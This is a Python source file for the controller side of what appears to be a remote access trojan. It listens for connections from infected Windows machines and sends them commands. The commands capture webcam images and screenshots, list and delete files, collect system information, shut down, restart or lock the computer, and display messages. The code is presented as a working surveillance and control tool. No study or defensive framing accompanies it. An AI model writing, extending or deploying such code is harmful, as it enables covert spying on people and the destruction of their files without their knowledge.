import socket, os

IPv4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
IPv4.connect(("8.8.8.8", 80))

HOST = "0.0.0.0"
PORT = 3000

def SocketConnection():
    global conn
    try:
        objConn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except (socket.error, Exception) as error1:
        print("[-] Error Occured: "+str(error1))
        
    try:
        objConn.bind((HOST,PORT))
        objConn.listen(20)
        print("(Listening for Incoming Connections)\n\n" + "Your IP: " + "(" +IPv4.getsockname()[0] + ")\nListening Port: " + "(" + str(PORT) + ")\n" + "_"*36)
    except (socket.error, Exception) as error2:
        print("[-] Error Occured: "+str(error2))
    
    while (True):
        try:
            conn, address = objConn.accept()
            os.system("cls")
            print("[+] Client Connected!\n" + str(conn.recv(256).decode()) + "\n" + "_"*35 + "\n")
            return (True)
        except (socket.error, Exception) as error3:
            print("[-] Error Occured: "+str(error3))
            continue

def Commands():
    print("_"*31 + "\n[Visual Commands]" + " "*13 + "|\n" + " "*30 + "|")
    print("[-sm] ~ Send Message (VBS)" + " "*4 + "|")
    print("_"*30 + "|\n[System Commands]" + " "*13 + "|\n" + " "*30 + "|")
    print("[-si] ~ System Information" + " "*4 + "|")
    print("[-sd] ~ Shutdown Computer" + " "*5 + "|")
    print("[-rc] ~ Restart Computer" + " "*6 + "|")
    print("[-lk] ~ Lock Computer" + " "*9 + "|")
    print("_"*30 + "|\n[File Commands]" + " "*15 + "|\n" + " "*30 + "|")
    print("[-gd] ~ Current Directory" + " "*5 + "|")
    print("[-vf] ~ View Files" + " "*12 + "|")
    print("[-df] ~ Delete File" + " "*11 + "|")
    print("_"*30 + "|\n[User Interface Commands]" + " "*5 + "|\n" + " "*30 + "|")
    print("[-wc] ~ Capture Webcam" + " "*8 + "|")
    print("[-ss] ~ Capture Screenshot" + " "*4 + "|")
    print("_"*30 + "|\n[Connection Commands]" + " "*9 + "|\n" + " "*30 + "|")
    print("[-tc] ~ Check Connection" + " "*6 + "|")
    print("[-bk] ~ Append Connection" + " "*5 + "|")
    print("[-cc] ~ Close Connection" + " "*6 + "|\n" + "_"*30 + "|\n")
    
def ViewFiles():
    conn.send("view-files".encode()); print("(Client Drives)\n\n" + conn.recv(256).decode() + "\n")
    select_path = input("[Directory]: ")
    conn.send(select_path.encode())
    print(conn.recv(1024).decode() + "\n")

def ReceiveWebcamImage():
    conn.send("activate-webcam".encode())
    print(conn.recv(256).decode())
    
    with open("webcam.png", "wb") as WebcamImage:
        WebcamImage.write(conn.recv(400000))
        WebcamImage.close()
        
    if (os.path.getsize("webcam.png") > 50000):
        return
    else: os.remove("webcam.png")
    
def ReceiveScreenshot():
    conn.send("capture-screen".encode())
    print(conn.recv(1024).decode())
    
    with open("screenshot.png", "wb") as Screenshot:
        Screenshot.write(conn.recv(150000))
        Screenshot.close()
        
    if (os.path.getsize("screenshot.png") > 5000):
        return
    else: os.remove("screenshot.png")
    
def DeleteFile():
    conn.send("delete-file".encode())
    DirFile = input("Enter Path (C:/.../file.exe): "); conn.send(DirFile.encode())
    if (conn.recv(256).decode() == "VALID PATH"):
        print("[Directory Exists]")
    else:
        print("Non-Existent Directory...\n")
        return
        
    print(conn.recv(256).decode() + "\n")

def SendCommands():
    while (True):
        try:
            RemoteCommand = input(">> ")
            if (RemoteCommand == "help" or RemoteCommand == "HELP"):
                Commands()
                
            elif (RemoteCommand == "cls" or RemoteCommand == "CLS" or RemoteCommand == "clear" or RemoteCommand == "CLEAR"):
                os.system("cls")
                
            elif (RemoteCommand == "-cc" or RemoteCommand == "-CC"):
                conn.send("terminate-connection".encode()); print("(Terminating Connection)")
                conn.close(); break;
                
            elif (RemoteCommand == "-bk" or RemoteCommand == "-BK"):
                conn.send("append-connection".encode()); print("(Appending Connection)"); break
                
            elif (RemoteCommand == "-tc" or RemoteCommand == "-TC"):
                conn.send("check-connection".encode()); print(str(conn.recv(256).decode()))
                
            elif (RemoteCommand == "-sm" or RemoteCommand == "-SM"):
                conn.send("message-box".encode()); message = input("(Type Message): ")
                conn.send(message.encode()); print(str(conn.recv(256).decode() + "\n"))
            
            elif (RemoteCommand == "-si" or RemoteCommand == "-SI"):
                conn.send("get-sys".encode()); print("[System Information]\n" + "-"*30 + "\n" + str(conn.recv(1024).decode()) + "\n")
            
            elif (RemoteCommand == "-sd" or RemoteCommand == "-SD"):
                conn.send("shutdown-pc".encode()); print(conn.recv(256).decode() + "\n")
            
            elif (RemoteCommand == "-rc" or RemoteCommand == "-RC"):
                conn.send("restart-pc".encode()); print(conn.recv(256).decode() + "\n")
                
            elif(RemoteCommand == "-lk" or RemoteCommand == "-LK"):
                conn.send("lock-pc".encode()); print(conn.recv(256).decode() + "\n")
                
            elif (RemoteCommand == "-gd" or RemoteCommand == "-GD"):
                conn.send("get-dir".encode()); print(conn.recv(256).decode() + "\n")
                
            elif (RemoteCommand == "-vf" or RemoteCommand == "-VF"):
                ViewFiles()
            
            elif (RemoteCommand == "-wc" or RemoteCommand == "-WC"):
                ReceiveWebcamImage()
                
            elif (RemoteCommand == "-ss" or RemoteCommand == "-SS"):
                ReceiveScreenshot()
                
            elif (RemoteCommand == "-df" or RemoteCommand == "-DF"):
                DeleteFile()
                
            else:
                print("(Invalid Command, try again)\n")
                
        except (KeyboardInterrupt):
            conn.send("append-connection".encode())
            print("\n\n[-] Keyboard Interrupted: Disconnecting...")
            break
                
        except (socket.error, Exception):
            os.system("cls"); print("[-] Lost Connection"); conn.close()
            reconnect = input("Attempt Reconnect? (y/n): ")
            if (reconnect == "y" or reconnect == "Y" or reconnect == "yes" or reconnect == "YES"):
                os.system("cls"); SocketConnection()
            else: exit(0)
                
SocketConnection()
SendCommands()